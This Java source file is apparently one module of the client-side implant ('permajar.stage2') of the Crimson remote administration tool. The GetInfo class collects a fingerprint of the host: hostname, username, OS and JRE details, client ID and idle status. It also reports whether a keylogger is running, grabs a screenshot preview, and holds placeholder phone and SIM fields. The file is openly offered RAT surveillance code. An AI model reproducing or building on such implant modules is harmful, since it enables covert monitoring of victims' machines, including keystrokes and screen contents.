package subterranean.crimson.permajar.stage2.modules;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 */

import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.HashMap;

import subterranean.crimson.permajar.stage2.Stage2;
import subterranean.crimson.permajar.stage2.modules.keylogger.Keylogger;
import subterranean.crimson.universal.NativeUtilities;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.Version;
import subterranean.crimson.universal.containers.Arch;

public class GetInfo {

	public static HashMap<String, Object> run() {

		HashMap<String, Object> info = new HashMap<String, Object>();

		try {
			info.put("hostname", InetAddress.getLocalHost().getHostName());
		} catch (UnknownHostException e) {

			info.put("hostname", "unknown");
		}
		info.put("username", System.getProperty("user.name"));
		info.put("operating_system", System.getProperty("os.name"));
		info.put("systemArch", Platform.systemX64 ? Arch.x64 : Arch.X86);
		info.put("jreArch", Platform.jreX64 ? Arch.x64 : Arch.X86);
		info.put("os_version", System.getProperty("os.version"));
		info.put("JREdir", System.getProperty("java.home"));
		info.put("JREversion", System.getProperty("java.version"));
		info.put("client_id", Stage2.getSettings().clientID);

		// idle time
		if (Stage2.idle.idle) {
			// system is idle
			info.put("activityStatus", "Idle");

		} else {
			// system is active
			info.put("activityStatus", "Active");

		}

		// enumerate network devices
		// try {
		// info.put("adapters", NetworkInterface.getNetworkInterfaces());
		// } catch (SocketException e1) {
		// // TODO Auto-generated catch block
		// e1.printStackTrace();
		// }
		
		info.put("messages", Stage2.getSettings().messages);

		info.put("keylogging", Keylogger.keylogging);

		info.put("jvmUptime", ManagementFactory.getRuntimeMXBean().getUptime());

		try {
			info.put("sysUptime", NativeUtilities.uptime());
		} catch (Throwable e) {
			info.put("sysUptime", 0l);
		}

		info.put("version", Version.version);

		info.put("power_tests", Power.power_test());

		info.put("phone_number", "None");

		info.put("IMEI", "None");

		info.put("operator_name", "None");

		info.put("SIM_operator_code", "None");

		info.put("SIM_serial", "None");

		info.put("preview", ScreenShot.run(140));

		return info;

	}

}
